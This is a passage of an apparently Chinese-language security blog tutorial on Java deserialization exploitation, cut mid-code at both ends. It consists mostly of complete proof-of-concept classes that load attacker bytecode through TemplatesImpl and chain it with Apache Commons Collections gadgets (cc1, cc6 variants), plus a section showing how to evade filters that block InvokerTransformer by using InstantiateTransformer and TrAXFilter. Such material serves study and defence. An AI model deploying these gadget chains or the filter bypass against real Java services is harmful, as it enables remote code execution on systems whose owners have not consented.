&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后构造poc：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.mashiro;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TemplatesImplDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">encoded</span> <span class="operator">=</span> GenerateClassBase.getEncodedClass();</span><br><span class="line">        <span class="type">byte</span>[] code = Base64.getDecoder().decode(encoded);</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;code&#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;Mash1r0&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        obj.newTransformer();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后就可以成功弹计算器了。</p><p>我们接着就可以去替代前面的cc1和cc6了，直接给出poc，就是将前面的链式调用的方法改为了newTransformer。</p><h3 id="cc1-TemplatesImpl"><a href="#cc1-TemplatesImpl" class="headerlink" title="cc1 + TemplatesImpl"></a>cc1 + TemplatesImpl</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.mashiro;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc3</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">encoded</span> <span class="operator">=</span> GenerateClassBase.getEncodedClass();</span><br><span class="line">        <span class="type">byte</span>[] code = Base64.getDecoder().decode(encoded);</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;code&#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;Mash1r0&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        Transformer[] Transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(obj),<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>,<span class="literal">null</span>,<span class="literal">null</span>)&#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(Transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;a&quot;</span>);</span><br><span class="line">        Map&lt;Object,Object&gt; transformedmap= TransformedMap.decorate(map,<span class="literal">null</span>,chainedTransformer);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor constructor=c.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Object o=constructor.newInstance(Target.class,transformedmap);</span><br><span class="line">        serialize(o);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(object);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        ObjectInputStream objectInputStream=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="cc6-TemplatesImpl"><a href="#cc6-TemplatesImpl" class="headerlink" title="cc6 + TemplatesImpl"></a>cc6 + TemplatesImpl</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.mashiro;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc3_1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">encoded</span> <span class="operator">=</span> GenerateClassBase.getEncodedClass();</span><br><span class="line">        <span class="type">byte</span>[] code = Base64.getDecoder().decode(encoded);</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;code&#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;Mash1r0&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        Transformer[] Transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(obj),<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>,<span class="literal">null</span>,<span class="literal">null</span>)&#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(Transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;a&quot;</span>);</span><br><span class="line">        Map&lt;Object,Object&gt; transformedmap = LazyMap.decorate(map,<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(transformedmap,<span class="string">&quot;a&quot;</span>);</span><br><span class="line">        HashMap&lt;Object,Integer&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(tiedMapEntry,<span class="number">1</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">lazyMapClass</span> <span class="operator">=</span> LazyMap.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">factoryField</span> <span class="operator">=</span> lazyMapClass.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        factoryField.set(transformedmap,chainedTransformer);</span><br><span class="line">        transformedmap.remove(<span class="string">&quot;a&quot;</span>);</span><br><span class="line">        serialize(hashMap);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(object);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        ObjectInputStream objectInputStream=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>拼接一下就行了。</p><h3 id="过滤问题"><a href="#过滤问题" class="headerlink" title="过滤问题"></a>过滤问题</h3><p>但现在很多过滤器都会过滤掉InvokerTransformer，这样之前的链子就打不通了，所以需要找个类来代替它。</p><p>我们先来了解两个类InstantiateTransformer与TrAXFilter。</p><p>InstantiateTransformer是cc库中一个Transform的实现，它通过反射创建一个新的实例对象。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (input <span class="keyword">instanceof</span> Class == <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(</span><br><span class="line">                <span class="string">&quot;InstantiateTransformer: Input object was not an instanceof Class, it was a &quot;</span></span><br><span class="line">                    + (input == <span class="literal">null</span> ? <span class="string">&quot;null object&quot;</span> : input.getClass().getName()));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">con</span> <span class="operator">=</span> ((Class) input).getConstructor(iParamTypes);</span><br><span class="line">        <span class="keyword">return</span> con.newInstance(iArgs);</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (NoSuchMethodException ex) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InstantiateTransformer: The constructor must exist and be public &quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (InstantiationException ex) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InstantiateTransformer: InstantiationException&quot;</span>, ex);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalAccessException ex) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InstantiateTransformer: Constructor must be public&quot;</span>, ex);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (InvocationTargetException ex) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InstantiateTransformer: Constructor threw an exception&quot;</span>, ex);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>核心是transform方法，会去使用反射实例化一个对象并且返回。</p><p>我们再看看TrAXFilter类。</p><p>TrAXFilter 类继承自 XMLFilterImpl，它是一个 SAX（Simple API for XML）过滤器，用于在 XML 解析的过程中 应用 XSLT 变换。这个类的主要作用是使用 Templates 对象来 对解析的 XML 数据进行转换，然后将转换后的数据传递给 ContentHandler 进行处理。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">TrAXFilter</span><span class="params">(Templates templates)</span>  <span class="keyword">throws</span></span><br><span class="line">    TransformerConfigurationException</span><br><span class="line">&#123;</span><br><span class="line">    _templates = templates;</span><br><span class="line">    _transformer = (TransformerImpl) templates.newTransformer();</span><br><span class="line">    _transformerHandler = <span class="keyword">new</span> <span class="title class_">TransformerHandlerImpl</span>(_transformer);</span><br><span class="line">    _useServicesMechanism = _transformer.useServicesMechnism();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>核心是在它的构造器，可以看到这里面有一个我们熟悉的方法，也就是newTransformer，并且这个templates我们是可控的。</p><p>也就是说我们可以通过InstantiateTransformer类的transform实例化出TrAXFilter从而去触发newTransform，也就绕过了InvokerTransformer被过滤的限制。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] Transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Templates.class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; obj &#125;)</span><br><span class="line"> &#125;;</span><br></pre></td></tr></table></figure><p>也就是从一个任意方法触发特定的newTransformer方法演变成了一条特定的链子去触发newTransformer。</p><p>最后完整的poc：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.mashiro;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc3_2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">encoded</span> <span class="operator">=</span> GenerateClassBase.getEncodedClass();</span><br><span class="line">        <span class="type">byte</span>[] code = Base64.getDecoder().decode(encoded);</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;code&#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;Mash1r0&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        Transformer[] Transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Templates.class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; obj &#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(Transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;a&quot;</span>);</span><br><span class="line">        Map&lt;Object,Object&gt; transformedmap = LazyMap.decorate(map,<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(transformedmap,<span class="string">&quot;a&quot;</span>);</span><br><span class="line">        HashMap&lt;Object,Integer&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(tiedMapEntry,<span class="number">1</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">lazyMapClass</span> <span class="operator">=</span> LazyMap.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">factoryField</span> <span class="operator">=</span> lazyMapClass.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        factoryField.set(transformedmap,chainedTransformer);</span><br><span class="line">        transformedmap.remove(<span class="string">&quot;a&quot;</span>);</span><br><span class="line">        serialize(hashMap);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span 